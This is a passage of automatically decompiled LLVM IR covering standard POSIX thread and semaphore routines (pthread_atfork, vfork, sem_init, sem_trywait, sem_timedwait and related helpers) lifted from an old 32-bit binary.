  %v3_8056e8e = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8078d2c.644 to i32), i32* nonnull %stack_var_-20)
  %v1_8056e96 = call i32 @pthread_mutexattr_destroy(i32 %v2_8056e43)
  %v0_8056e9e = call i32 @__pthread_reset_main_thread()
  %v0_8056ea3 = call i32 @__fresetlockfiles()
  %v0_8056ea8 = call i32 @__pthread_once_fork_child()
  %v0_8056ead = load i32, i32* @ebp, align 4
  store i32 %v0_8056ead, i32* @eax, align 4
  %v0_8056eaf = call i32 @pthread_call_handlers()
  br label %dec_label_pc_8056ede

dec_label_pc_8056eb6:                             ; preds = %entry
  %v1_8056ebe = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  %v1_8056eca = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8078d2c.644 to i32))
  %v0_8056ecf = call i32 @__pthread_once_fork_parent()
  %v0_8056ed4 = load i32, i32* @ebx, align 4
  store i32 %v0_8056ed4, i32* @eax, align 4
  %v0_8056ed6 = call i32 @pthread_call_handlers()
  br label %dec_label_pc_8056ede

dec_label_pc_8056ede:                             ; preds = %dec_label_pc_8056e37, %dec_label_pc_8056eb6
  %v0_8056ee1 = load i32, i32* @edi, align 4
  %v2_8056ee3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056ee3, i32* @ebx, align 4
  store i32 %v0_8056df3, i32* @esi, align 4
  store i32 %v0_8056df2, i32* @edi, align 4
  store i32 %v0_8056df1, i32* @ebp, align 4
  ret i32 %v0_8056ee1

; uselistorder directives
  uselistorder i32 %v0_8056e29, { 1, 0 }
  uselistorder i32 ()* @pthread_call_handlers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056ede, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v1_8056ee8 = call i32 @fork(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8056ee8
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8056ef3 = call i32 @malloc(i32 24)
  store i32 %v1_8056ef3, i32* @ebx, align 4
  %v1_8056f02 = icmp eq i32 %v1_8056ef3, 0
  br i1 %v1_8056f02, label %dec_label_pc_8056f5a, label %dec_label_pc_8056f06

dec_label_pc_8056f06:                             ; preds = %entry
  %v1_8056f0e = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8078d2c.644 to i32))
  store i32 %v1_8056ef3, i32* @ecx, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 ptrtoint (i32* @global_var_8078d44.645 to i32), i32* @eax, align 4
  %v1_8056f20 = call i32 @pthread_insert_list(i32 0)
  store i32 %arg2, i32* @edx, align 4
  %v1_8056f2b = add i32 %v1_8056ef3, 8
  store i32 %v1_8056f2b, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8078d4c.647 to i32), i32* @eax, align 4
  %v1_8056f33 = call i32 @pthread_insert_list(i32 1)
  store i32 %arg3, i32* @edx, align 4
  %v1_8056f3e = add i32 %v1_8056ef3, 16
  store i32 %v1_8056f3e, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8078d48.646 to i32), i32* @eax, align 4
  %v1_8056f46 = call i32 @pthread_insert_list(i32 1)
  %v1_8056f50 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8078d2c.644 to i32))
  br label %dec_label_pc_8056f5a

dec_label_pc_8056f5a:                             ; preds = %entry, %dec_label_pc_8056f06
  %v0_8056f5d = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_8056f06 ]
  ret i32 %v0_8056f5d

; uselistorder directives
  uselistorder i32 %v1_8056ef3, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @pthread_insert_list, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056f5a, { 1, 0 }
}

define i32 @enqueue() local_unnamed_addr {
entry:
  %v0_8056f61 = load i32, i32* @edx, align 4
  %v1_8056f61 = add i32 %v0_8056f61, 24
  %v2_8056f61 = inttoptr i32 %v1_8056f61 to i32*
  %v3_8056f61 = load i32, i32* %v2_8056f61, align 4
  store i32 %v3_8056f61, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056f7d = load i32, i32* @ebx, align 4
  store i32 %v0_8056f7d, i32* %stack_var_-4, align 4
  %v0_8056f7e = load i32, i32* @eax, align 4
  br label %dec_label_pc_8056f9c

dec_label_pc_8056f82:                             ; preds = %dec_label_pc_8056f9c
  %v1_8056f82 = load i32, i32* @edx, align 4
  %v12_8056f82 = icmp eq i32 %v2_8056f9c, %v1_8056f82
  %v1_8056f84 = icmp eq i1 %v12_8056f82, false
  %v1_8056f99 = add i32 %v2_8056f9c, 8
  br i1 %v1_8056f84, label %dec_label_pc_8056f9c, label %dec_label_pc_8056f86

dec_label_pc_8056f86:                             ; preds = %dec_label_pc_8056f82
  %v2_8056f86 = inttoptr i32 %v1_8056f99 to i32*
  %v3_8056f86 = load i32, i32* %v2_8056f86, align 4
  store i32 %v3_8056f86, i32* %v1_8056f9c, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_8056f86, align 4
  %v2_8056fa4.pre = load i32, i32* %stack_var_-4, align 4
  %v0_8056fa5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056fa4

dec_label_pc_8056f9c:                             ; preds = %dec_label_pc_8056f82, %entry
  %v1_8056f89 = phi i32 [ %v0_8056f7e, %entry ], [ %v1_8056f99, %dec_label_pc_8056f82 ]
  %v1_8056f9c = inttoptr i32 %v1_8056f89 to i32*
  %v2_8056f9c = load i32, i32* %v1_8056f9c, align 4
  %v1_8056f9e = icmp eq i32 %v2_8056f9c, 0
  %v1_8056fa0 = icmp eq i1 %v1_8056f9e, false
  br i1 %v1_8056fa0, label %dec_label_pc_8056f82, label %dec_label_pc_8056fa2

dec_label_pc_8056fa2:                             ; preds = %dec_label_pc_8056f9c
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056fa4

dec_label_pc_8056fa4:                             ; preds = %dec_label_pc_8056f86, %dec_label_pc_8056fa2
  %v0_8056fa5 = phi i32 [ %v0_8056fa5.pre, %dec_label_pc_8056f86 ], [ 0, %dec_label_pc_8056fa2 ]
  %v2_8056fa4 = phi i32 [ %v2_8056fa4.pre, %dec_label_pc_8056f86 ], [ %v0_8056f7d, %dec_label_pc_8056fa2 ]
  store i32 %v2_8056fa4, i32* @ebx, align 4
  ret i32 %v0_8056fa5

; uselistorder directives
  uselistorder i32 %v2_8056f9c, { 2, 0, 1 }
  uselistorder i32* %v1_8056f9c, { 1, 0 }
  uselistorder i32 %v1_8056f99, { 1, 0 }
  uselistorder label %dec_label_pc_8056fa4, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8056faa = add i32 %arg1, 8
  %v2_8056faa = inttoptr i32 %v1_8056faa to i32*
  %v3_8056faa = load i32, i32* %v2_8056faa, align 4
  store i32 %v3_8056faa, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8056fb6 = load i32, i32* @esi, align 4
  %v0_8056fb7 = load i32, i32* @ebx, align 4
  %v0_8056fbb = load i32, i32* @eax, align 4
  store i32 %v0_8056fbb, i32* @ebx, align 4
  %v0_8056fbd = load i32, i32* @edx, align 4
  store i32 %v0_8056fbd, i32* @esi, align 4
  %v1_8056fbf = icmp eq i32 %v0_8056fbd, 0
  br i1 %v1_8056fbf, label %dec_label_pc_8056fcb, label %dec_label_pc_8056fc3

dec_label_pc_8056fc3:                             ; preds = %entry
  %v1_8056fc3 = add i32 %v0_8056fbb, 64
  %v2_8056fc3 = inttoptr i32 %v1_8056fc3 to i8*
  %v3_8056fc3 = load i8, i8* %v2_8056fc3, align 1
  %v4_8056fc3 = icmp eq i8 %v3_8056fc3, 0
  %v1_8056fc7 = icmp eq i1 %v4_8056fc3, false
  br i1 %v1_8056fc7, label %dec_label_pc_8056fed, label %dec_label_pc_8056fd5

dec_label_pc_8056fcb:                             ; preds = %entry
  %v1_8056fcb = add i32 %v0_8056fbb, 28
  %v2_8056fcb = inttoptr i32 %v1_8056fcb to i32*
  %v3_8056fcb = load i32, i32* %v2_8056fcb, align 4
  store i32 %v3_8056fcb, i32* @eax, align 4
  store i32 %v0_8056fbb, i32* @edx, align 4
  %v1_8056fd0 = call i32 @__pthread_lock(i32 %v0_8056fb7)
  %v1_8056fd5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056fd5

dec_label_pc_8056fd5:                             ; preds = %dec_label_pc_8056fc3, %dec_label_pc_8056fcb
  %v1_8056fd5 = phi i32 [ %v0_8056fbb, %dec_label_pc_8056fc3 ], [ %v1_8056fd5.pre, %dec_label_pc_8056fcb ]
  %v2_8056fd5 = add i32 %v1_8056fd5, 444
  %v3_8056fd5 = inttoptr i32 %v2_8056fd5 to i32*
  store i32 %v0_8056fbd, i32* %v3_8056fd5, align 4
  %v1_8056fdd = icmp eq i1 %v1_8056fbf, false
  br i1 %v1_8056fdd, label %dec_label_pc_8056fed, label %dec_label_pc_8056fdf

dec_label_pc_8056fdf:                             ; preds = %dec_label_pc_8056fd5
  %v0_8056fe2 = load i32, i32* @ebx, align 4
  %v1_8056fe2 = add i32 %v0_8056fe2, 28
  %v2_8056fe2 = inttoptr i32 %v1_8056fe2 to i32*
  %v3_8056fe2 = load i32, i32* %v2_8056fe2, align 4
  %v1_8056fe5 = inttoptr i32 %v3_8056fe2 to i32*
  %v2_8056fe5 = call i32 @__pthread_unlock(i32* %v1_8056fe5)
  br label %dec_label_pc_8056fed

dec_label_pc_8056fed:                             ; preds = %dec_label_pc_8056fd5, %dec_label_pc_8056fc3, %dec_label_pc_8056fdf
  %v2_8056fed = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8056fb7, i32* @ebx, align 4
  store i32 %v0_8056fb6, i32* @esi, align 4
  ret i32 %v2_8056fed

; uselistorder directives
  uselistorder i1 %v1_8056fbf, { 1, 0 }
  uselistorder label %dec_label_pc_8056fed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056fd5, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v1_8056ff4 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8056ff9 = inttoptr i32 %v1_8056ff4 to i32*
  store i32 38, i32* %v1_8056ff9, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v1_8057009 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805700e = inttoptr i32 %v1_8057009 to i32*
  store i32 38, i32* %v1_805700e, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v1_805701e = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8057023 = inttoptr i32 %v1_805701e to i32*
  store i32 38, i32* %v1_8057023, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057038 = add i32 %arg1, 12
  %v2_8057038 = inttoptr i32 %v1_8057038 to i32*
  %v3_8057038 = load i32, i32* %v2_8057038, align 4
  %v4_8057038 = icmp eq i32 %v3_8057038, 0
  br i1 %v4_8057038, label %dec_label_pc_805704c, label %dec_label_pc_805703e

dec_label_pc_805703e:                             ; preds = %entry
  %v1_805703e = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8057046 = inttoptr i32 %v1_805703e to i32*
  store i32 16, i32* %v1_8057046, align 4
  %v0_805704c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805704c

dec_label_pc_805704c:                             ; preds = %entry, %dec_label_pc_805703e
  %v0_805704c = phi i32 [ 0, %entry ], [ %v0_805704c.pre, %dec_label_pc_805703e ]
  ret i32 %v0_805704c

; uselistorder directives
  uselistorder label %dec_label_pc_805704c, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8057053 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805705f = call i32 @__pthread_lock(i32 %v0_8057053)
  %v0_8057064 = load i32, i32* @ebx, align 4
  %v1_8057064 = add i32 %v0_8057064, 8
  %v2_8057064 = inttoptr i32 %v1_8057064 to i32*
  %v3_8057064 = load i32, i32* %v2_8057064, align 4
  %v1_8057067 = icmp eq i32 %v3_8057064, 0
  %v1_8057069 = icmp eq i1 %v1_8057067, false
  br i1 %v1_8057069, label %dec_label_pc_805707b, label %dec_label_pc_805706b

dec_label_pc_805706b:                             ; preds = %entry
  %v1_805706b = call i32 @__errno_location(i32 %v0_8057053)
  store i32 -1, i32* @esi, align 4
  %v1_8057073 = inttoptr i32 %v1_805706b to i32*
  store i32 11, i32* %v1_8057073, align 4
  br label %dec_label_pc_8057081

dec_label_pc_805707b:                             ; preds = %entry
  %v1_805707b = add i32 %v3_8057064, -1
  store i32 0, i32* @esi, align 4
  store i32 %v1_805707b, i32* %v2_8057064, align 4
  br label %dec_label_pc_8057081

dec_label_pc_8057081:                             ; preds = %dec_label_pc_805706b, %dec_label_pc_805707b
  %v0_8057084 = load i32, i32* @ebx, align 4
  %v1_8057085 = inttoptr i32 %v0_8057084 to i32*
  %v2_8057085 = call i32 @__pthread_unlock(i32* %v1_8057085)
  %v0_805708a = load i32, i32* @esi, align 4
  ret i32 %v0_805708a

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057081, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  %v2_805709d = icmp slt i32 %arg3, 0
  %v1_805709f = icmp eq i1 %v2_805709d, false
  br i1 %v1_805709f, label %dec_label_pc_80570ae, label %dec_label_pc_80570a1

dec_label_pc_80570a1:                             ; preds = %entry
  %v1_80570a1 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80570a1, i32* %eax.global-to-local, align 4
  %v1_80570a6 = inttoptr i32 %v1_80570a1 to i32*
  store i32 22, i32* %v1_80570a6, align 4
  br label %dec_label_pc_80570de

dec_label_pc_80570ae:                             ; preds = %entry
  %v4_80570ae = icmp eq i32 %arg2, 0
  br i1 %v4_80570ae, label %dec_label_pc_80570c5, label %dec_label_pc_80570b5

dec_label_pc_80570b5:                             ; preds = %dec_label_pc_80570ae
  %v1_80570b5 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80570b5, i32* %eax.global-to-local, align 4
  %v1_80570ba = inttoptr i32 %v1_80570b5 to i32*
  store i32 38, i32* %v1_80570ba, align 4
  br label %dec_label_pc_80570de

dec_label_pc_80570c5:                             ; preds = %dec_label_pc_80570ae
  store i32 0, i32* %arg1, align 4
  %v0_80570cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80570cb = add i32 %v0_80570cb, 4
  %v2_80570cb = inttoptr i32 %v1_80570cb to i32*
  store i32 0, i32* %v2_80570cb, align 4
  %v1_80570d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80570d2 = add i32 %v1_80570d2, 8
  %v3_80570d2 = inttoptr i32 %v2_80570d2 to i32*
  store i32 %arg3, i32* %v3_80570d2, align 4
  %v0_80570d5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80570d5 = add i32 %v0_80570d5, 12
  %v2_80570d5 = inttoptr i32 %v1_80570d5 to i32*
  store i32 0, i32* %v2_80570d5, align 4
  br label %dec_label_pc_80570de

dec_label_pc_80570de:                             ; preds = %dec_label_pc_80570b5, %dec_label_pc_80570a1, %dec_label_pc_80570c5
  %storemerge = phi i32 [ 0, %dec_label_pc_80570c5 ], [ -1, %dec_label_pc_80570a1 ], [ -1, %dec_label_pc_80570b5 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80570de, { 2, 0, 1 }
}

define i32 @thread_self.1(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80570e9 = load i32, i32* @esp, align 4
  %v1_80570e9 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_80570e9 = icmp ult i32 %v0_80570e9, %v1_80570e9
  %v1_80570ef = icmp eq i1 %v7_80570e9, false
  br i1 %v1_80570ef, label %dec_label_pc_8057120, label %dec_label_pc_80570f1

dec_label_pc_80570f1:                             ; preds = %entry
  %v1_80570f1 = load i32, i32* @global_var_8078e70.616, align 16
  %v7_80570f1 = icmp ult i32 %v0_80570e9, %v1_80570f1
  br i1 %v7_80570f1, label %dec_label_pc_8057106, label %dec_label_pc_80570f9

dec_label_pc_80570f9:                             ; preds = %dec_label_pc_80570f1
  %v1_80570fe = load i32, i32* @global_var_8078e74.618, align 4
  %v7_80570fe = icmp ult i32 %v0_80570e9, %v1_80570fe
  br i1 %v7_80570fe, label %dec_label_pc_8057120, label %dec_label_pc_8057106

dec_label_pc_8057106:                             ; preds = %dec_label_pc_80570f9, %dec_label_pc_80570f1
  %v0_8057106 = load i32, i32* @global_var_807e578.619, align 8
  %v1_8057106 = icmp eq i32 %v0_8057106, 0
  br i1 %v1_8057106, label %dec_label_pc_8057114, label %dec_label_pc_805710f

dec_label_pc_805710f:                             ; preds = %dec_label_pc_8057106
  %v0_805710f = call i32 @__pthread_find_self()
  br label %dec_label_pc_8057114

dec_label_pc_8057114:                             ; preds = %dec_label_pc_8057106, %dec_label_pc_805710f
  %v2_805711a = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8057120

dec_label_pc_8057120:                             ; preds = %dec_label_pc_80570f9, %entry, %dec_label_pc_8057114
  %v0_8057120 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_80570f9 ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_805711a, %dec_label_pc_8057114 ]
  ret i32 %v0_8057120

; uselistorder directives
  uselistorder label %dec_label_pc_8057120, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057114, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8057121 = load i32, i32* @esi, align 4
  %v0_8057122 = load i32, i32* @ebx, align 4
  %v2_8057126 = call i32 @thread_self.1(i32 %v0_8057122, i32 %v0_8057121)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8057126, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8057139 = call i32 @__pthread_lock(i32 %v2_8057126)
  store i32 %arg2, i32* @edx, align 4
  %v0_8057142 = load i32, i32* @ebx, align 4
  %v1_8057142 = add i32 %v0_8057142, 12
  store i32 %v1_8057142, i32* @eax, align 4
  %v0_8057145 = call i32 @remove_from_queue()
  store i32 %v0_8057145, i32* @esi, align 4
  %v0_805714f = load i32, i32* @ebx, align 4
  %v1_8057150 = inttoptr i32 %v0_805714f to i32*
  %v2_8057150 = call i32 @__pthread_unlock(i32* %v1_8057150)
  %v0_8057155 = load i32, i32* @esi, align 4
  ret i32 %v0_8057155

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend() local_unnamed_addr {
entry:
  %v0_8057160 = load i32, i32* @eax, align 4
  %v1_8057161 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8057160)
  ret i32 %v1_8057161
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_805716c = load i32, i32* @esi, align 4
  %v0_805716d = load i32, i32* @ebx, align 4
  store i32 %v0_805716d, i32* %stack_var_-16, align 4
  %v4_805716d = ptrtoint i32* %stack_var_-16 to i32
  %v2_8057171 = call i32 @thread_self.1(i32 %v0_805716d, i32 %v0_805716c)
  store i32 %arg1, i32* @edi, align 4
  store i32 %v2_8057171, i32* @edx, align 4
  store i32 %v2_8057171, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v0_8057184 = load i32, i32* %stack_var_-16, align 4
  %v1_8057184 = call i32 @__pthread_lock(i32 %v0_8057184)
  %v0_8057189 = load i32, i32* @edi, align 4
  %v1_8057189 = add i32 %v0_8057189, 8
  %v2_8057189 = inttoptr i32 %v1_8057189 to i32*
  %v3_8057189 = load i32, i32* %v2_8057189, align 4
  %tmp20 = icmp slt i32 %v3_8057189, 1
  br i1 %tmp20, label %dec_label_pc_80571a1, label %dec_label_pc_8057190

dec_label_pc_8057190:                             ; preds = %entry
  %v1_8057190 = add i32 %v3_8057189, -1
  store i32 %v1_8057190, i32* %v2_8057189, align 4
  %v0_8057197 = load i32, i32* @edi, align 4
  store i32 %v0_8057197, i32* %stack_var_-60, align 4
  %v1_8057198 = inttoptr i32 %v0_8057197 to i32*
  %v2_8057198 = call i32 @__pthread_unlock(i32* %v1_8057198)
  br label %dec_label_pc_80571c1

dec_label_pc_80571a1:                             ; preds = %entry
  %v0_80571a1 = load i32, i32* @ebp, align 4
  %v1_80571a1 = add i32 %v0_80571a1, 4
  %v2_80571a1 = inttoptr i32 %v1_80571a1 to i32*
  %v3_80571a1 = load i32, i32* %v2_80571a1, align 4
  %tmp23 = icmp ult i32 %v3_80571a1, 1000000000
  br i1 %tmp23, label %dec_label_pc_80571c9, label %dec_label_pc_80571aa

dec_label_pc_80571aa:                             ; preds = %dec_label_pc_80571a1
  store i32 %v0_8057189, i32* %stack_var_-60, align 4
  %v1_80571ae = inttoptr i32 %v0_8057189 to i32*
  %v2_80571ae = call i32 @__pthread_unlock(i32* %v1_80571ae)
  %v1_80571b3 = call i32 @__errno_location(i32 %v0_8057189)
  %v1_80571b8 = inttoptr i32 %v1_80571b3 to i32*
  store i32 22, i32* %v1_80571b8, align 4
  br label %dec_label_pc_80571c1

dec_label_pc_80571c1:                             ; preds = %dec_label_pc_8057190, %dec_label_pc_80571aa
  %storemerge = phi i32 [ -1, %dec_label_pc_80571aa ], [ 0, %dec_label_pc_8057190 ]
  br label %dec_label_pc_80572bb

dec_label_pc_80571c9:                             ; preds = %dec_label_pc_80571a1
  store i32 %v0_8057189, i32* %stack_var_-24, align 4
  %v2_80571d5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80571d5, i32* @edx, align 4
  %v0_80571d9 = load i32, i32* @esi, align 4
  %v1_80571d9 = add i32 %v0_80571d9, 442
  %v2_80571d9 = inttoptr i32 %v1_80571d9 to i8*
  store i8 0, i8* %v2_80571d9, align 1
  %v0_80571e0 = load i32, i32* @esi, align 4
  store i32 %v0_80571e0, i32* @eax, align 4
  %v0_80571e2 = load i32, i32* %stack_var_-24, align 4
  %v2_80571e2 = call i32 @__pthread_set_own_extricate_if(i32 %v0_80571e2, i32 134574369)
  %v0_80571e7 = load i32, i32* @esi, align 4
  %v1_80571e7 = add i32 %v0_80571e7, 66
  %v2_80571e7 = inttoptr i32 %v1_80571e7 to i8*
  %v3_80571e7 = load i8, i8* %v2_80571e7, align 1
  %v4_80571e7 = icmp eq i8 %v3_80571e7, 0
  br i1 %v4_80571e7, label %dec_label_pc_80571f8, label %dec_label_pc_80571ed

dec_label_pc_80571ed:                             ; preds = %dec_label_pc_80571c9
  store i32 1, i32* @ebx, align 4
  %v1_80571f2 = add i32 %v0_80571e7, 64
  %v2_80571f2 = inttoptr i32 %v1_80571f2 to i8*
  %v3_80571f2 = load i8, i8* %v2_80571f2, align 1
  %v4_80571f2 = icmp eq i8 %v3_80571f2, 0
  br i1 %v4_80571f2, label %dec_label_pc_8057204, label %dec_label_pc_80571f8

dec_label_pc_80571f8:                             ; preds = %dec_label_pc_80571ed, %dec_label_pc_80571c9
  store i32 %v0_80571e7, i32* @edx, align 4
  %v0_80571fd = call i32 @enqueue()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8057204

dec_label_pc_8057204:                             ; preds = %dec_label_pc_80571ed, %dec_label_pc_80571f8
  %v0_8057207 = load i32, i32* @edi, align 4
  store i32 %v0_8057207, i32* %stack_var_-60, align 4
  %v1_8057208 = inttoptr i32 %v0_8057207 to i32*
  %v2_8057208 = call i32 @__pthread_unlock(i32* %v1_8057208)
  %v0_8057210 = load i32, i32* @ebx, align 4
  %v1_8057210 = icmp eq i32 %v0_8057210, 0
  br i1 %v1_8057210, label %dec_label_pc_805721f.preheader, label %dec_label_pc_8057214

dec_label_pc_805721f.preheader:                   ; preds = %dec_label_pc_8057204
  %v0_8057222.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805721f

dec_label_pc_8057214:                             ; preds = %dec_label_pc_8057204
  store i32 0, i32* @edx, align 4
  %v0_8057216 = load i32, i32* @esi, align 4
  store i32 %v0_8057216, i32* @eax, align 4
  %v0_8057218 = load i32, i32* %stack_var_-60, align 4
  %v2_8057218 = call i32 @__pthread_set_own_extricate_if(i32 %v0_8057218, i32 %tmp14)
  br label %dec_label_pc_8057292

dec_label_pc_805721f:                             ; preds = %dec_label_pc_805726d, %dec_label_pc_8057264, %dec_label_pc_805721f.preheader
  %v0_8057222 = phi i32 [ %v0_8057222.pre, %dec_label_pc_805721f.preheader ], [ %v0_805725b, %dec_label_pc_8057264 ], [ %v0_805725b, %dec_label_pc_805726d ]
  %v0_805721f = load i32, i32* @ecx, align 4
  %v0_8057221 = load i32, i32* @ebp, align 4
  store i32 %v0_8057222, i32* %stack_var_-60, align 4
  %v3_8057223 = inttoptr i32 %v0_805721f to i32*
  %v4_8057223 = call i32 @__pthread_timedsuspend_new(i32 %v0_8057222, i32* %v3_8057223, i32 %v0_805721f)
  %v1_805722b = icmp eq i32 %v4_8057223, 0
  %v1_805722d = icmp eq i1 %v1_805722b, false
  br i1 %v1_805722d, label %dec_label_pc_805725b, label %dec_label_pc_805722f

dec_label_pc_805722f:                             ; preds = %dec_label_pc_805721f
  %v0_805722f = load i32, i32* @esi, align 4
  store i32 %v0_805722f, i32* @edx, align 4
  %v0_8057231 = load i32, i32* @edi, align 4
  store i32 %v0_8057231, i32* @eax, align 4
  %v0_8057233 = load i32, i32* %stack_var_-60, align 4
  %v1_8057233 = call i32 @__pthread_lock(i32 %v0_8057233)
  %v0_8057238 = load i32, i32* @esi, align 4
  store i32 %v0_8057238, i32* @edx, align 4
  %v0_805723a = load i32, i32* @edi, align 4
  %v1_805723a = add i32 %v0_805723a, 12
  store i32 %v1_805723a, i32* @eax, align 4
  %v0_805723d = call i32 @remove_from_queue()
  store i32 %v0_805723d, i32* @ebx, align 4
  %v0_8057247 = load i32, i32* @edi, align 4
  store i32 %v0_8057247, i32* %stack_var_-60, align 4
  %v1_8057248 = inttoptr i32 %v0_8057247 to i32*
  %v2_8057248 = call i32 @__pthread_unlock(i32* %v1_8057248)
  %v1_8057250 = icmp eq i32 %v0_805723d, 0
  %v1_8057252 = icmp eq i1 %v1_8057250, false
  br i1 %v1_8057252, label %dec_label_pc_80572a0, label %dec_label_pc_8057254

dec_label_pc_8057254:                             ; preds = %dec_label_pc_805722f
  %v0_8057254 = load i32, i32* @esi, align 4
  store i32 %v0_8057254, i32* @eax, align 4
  %v0_8057256 = call i32 @suspend()
  br label %dec_label_pc_805725b

dec_label_pc_805725b:                             ; preds = %dec_label_pc_805721f, %dec_label_pc_8057254
  %v0_805725b = load i32, i32* @esi, align 4
  %v1_805725b = add i32 %v0_805725b, 442
  %v2_805725b = inttoptr i32 %v1_805725b to i8*
  %v3_805725b = load i8, i8* %v2_805725b, align 1
  %v4_805725b = icmp eq i8 %v3_805725b, 0
  %v1_8057262 = icmp eq i1 %v4_805725b, false
  br i1 %v1_8057262, label %dec_label_pc_8057273, label %dec_label_pc_8057264

dec_label_pc_8057264:                             ; preds = %dec_label_pc_805725b
  %v1_8057264 = add i32 %v0_805725b, 440
  %v2_8057264 = inttoptr i32 %v1_8057264 to i8*
  %v3_8057264 = load i8, i8* %v2_8057264, align 1
  %v4_8057264 = icmp eq i8 %v3_8057264, 0
  br i1 %v4_8057264, label %dec_label_pc_805721f, label %dec_label_pc_805726d

dec_label_pc_805726d:                             ; preds = %dec_label_pc_8057264
  %v1_805726d = add i32 %v0_805725b, 64
  %v2_805726d = inttoptr i32 %v1_805726d to i8*
  %v3_805726d = load i8, i8* %v2_805726d, align 1
  %v4_805726d = icmp eq i8 %v3_805726d, 0
  %v1_8057271 = icmp eq i1 %v4_805726d, false
  br i1 %v1_8057271, label %dec_label_pc_805721f, label %dec_label_pc_8057273

dec_label_pc_8057273:                             ; preds = %dec_label_pc_805726d, %dec_label_pc_805725b
  store i32 0, i32* @edx, align 4
  store i32 %v0_805725b, i32* @eax, align 4
  %v0_8057277 = load i32, i32* %stack_var_-60, align 4
